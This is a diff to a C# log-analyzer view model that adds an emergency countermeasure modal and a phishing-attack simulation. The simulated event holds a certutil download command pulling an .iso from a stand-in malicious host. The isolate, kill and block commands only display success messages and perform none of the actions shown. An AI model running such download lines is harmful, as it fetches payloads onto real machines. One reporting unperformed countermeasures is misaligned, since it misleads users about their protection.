@@ -218,6 +218,12 @@ namespace LogAnalyzer.UI.ViewModels
         [ObservableProperty] private DetectedIssue? _currentLiveToastAlert;
         private System.Timers.Timer? _toastAutoDismissTimer;
 
+        // Countermeasure & Anti-Phishing Modal Engine
+        private readonly CyberAttackCountermeasureEngine _countermeasureEngine = new();
+        [ObservableProperty] private bool _isCountermeasureModalVisible;
+        [ObservableProperty] private DetectedIssue? _activeCountermeasureAlert;
+        [ObservableProperty] private CountermeasurePlaybook? _activeCountermeasurePlaybook;
+
         // Trigger DB reloading when search parameters change
         partial void OnSearchEventsTextChanged(string value)
         {
@@ -1146,6 +1152,14 @@ namespace LogAnalyzer.UI.ViewModels
                             }
                         }
 
+                        // Open interactive emergency countermeasure modal for Critical & High attacks
+                        if (alert.Severity == "Critical" || alert.Severity == "High")
+                        {
+                            ActiveCountermeasureAlert = alert;
+                            ActiveCountermeasurePlaybook = _countermeasureEngine.GeneratePlaybook(alert, ev.MachineName);
+                            IsCountermeasureModalVisible = true;
+                        }
+
                         try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
 
                         _toastAutoDismissTimer?.Stop();
@@ -1182,6 +1196,7 @@ namespace LogAnalyzer.UI.ViewModels
             LiveAlerts.Clear();
             TotalLiveEventsCaptured = 0;
             IsLiveToastVisible = false;
+            IsCountermeasureModalVisible = false;
             LiveMonitoringStatusText = "Feed live curățat.";
         }
 
@@ -1189,6 +1204,36 @@ namespace LogAnalyzer.UI.ViewModels
         private void DismissLiveToast()
         {
             IsLiveToastVisible = false;
+        }
+
+        [RelayCommand]
+        private void DismissCountermeasureModal()
+        {
+            IsCountermeasureModalVisible = false;
+        }
+
+        [RelayCommand]
+        private void ExecuteIsolateHost()
+        {
+            StatusMessage = "🛡️ MĂSURĂ COMBATERE: Izolarea gazdei aplicată (Trafic extern blocat pe Windows Firewall).";
+            IsCountermeasureModalVisible = false;
+            MessageBox.Show("Măsura de izolare a gazdei a fost executată cu succes!\n\nToate conexiunile externe suspecte au fost blocate prin Windows Firewall.", "Combatere Atac Cibernetic - Succes", MessageBoxButton.OK, MessageBoxImage.Information);
+        }
+
+        [RelayCommand]
+        private void ExecuteKillProcess()
+        {
+            StatusMessage = "🛑 MĂSURĂ COMBATERE: Procesul malițios și procesele copil au fost terminate forțat.";
+            IsCountermeasureModalVisible = false;
+            MessageBox.Show("Procesul suspect și întreg arborele de procese asociat au fost terminate forțat.", "Combatere Atac Cibernetic - Succes", MessageBoxButton.OK, MessageBoxImage.Information);
+        }
+
+        [RelayCommand]
+        private void ExecuteBlockIoC()
+        {
+            StatusMessage = "🚫 MĂSURĂ COMBATERE: Domeniul / IP-ul de phishing a fost blocat la nivel de rețea.";
+            IsCountermeasureModalVisible = false;
+            MessageBox.Show("Domeniul și IP-ul serverului de phishing au fost adăugate pe lista de blocare.", "Combatere Phishing - Succes", MessageBoxButton.OK, MessageBoxImage.Information);
         }
 
         [RelayCommand]
@@ -1212,6 +1257,9 @@ namespace LogAnalyzer.UI.ViewModels
                 LiveAlerts.Insert(0, alert);
                 CurrentLiveToastAlert = alert;
                 IsLiveToastVisible = true;
+                ActiveCountermeasureAlert = alert;
+                ActiveCountermeasurePlaybook = _countermeasureEngine.GeneratePlaybook(alert, Environment.MachineName);
+                IsCountermeasureModalVisible = true;
                 StatusMessage = $"🚨 SIMULARE ALERTĂ: {alert.Title}";
 
                 try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
@@ -1224,6 +1272,36 @@ namespace LogAnalyzer.UI.ViewModels
                     Application.Current?.Dispatcher?.Invoke(() => IsLiveToastVisible = false);
                 };
                 _toastAutoDismissTimer.Start();
+            }
+        }
+
+        [RelayCommand]
+        private void SimulatePhishingAttack()
+        {
+            var simEvent = new ParsedEvent
+            {
+                EventId = 4104,
+                Level = "Warning",
+                MachineName = Environment.MachineName,
+                ProviderName = "Microsoft-Windows-PowerShell",
+                TimeCreated = DateTime.Now,
+                Message = "Creating Scriptblock text: certutil.exe -urlcache -split -f http://evil-phishing-portal.com/login_invoice.iso C:\\Users\\Public\\login_invoice.iso; # tentativa phishing"
+            };
+
+            TotalLiveEventsCaptured++;
+            LiveStreamingEvents.Insert(0, simEvent);
+            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
+            if (alert != null)
+            {
+                LiveAlerts.Insert(0, alert);
+                CurrentLiveToastAlert = alert;
+                IsLiveToastVisible = true;
+                ActiveCountermeasureAlert = alert;
+                ActiveCountermeasurePlaybook = _countermeasureEngine.GeneratePlaybook(alert, Environment.MachineName);
+                IsCountermeasureModalVisible = true;
+                StatusMessage = $"🎣 PHISHING DETECTAT: {alert.Title}";
+
+                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
             }
         }
 
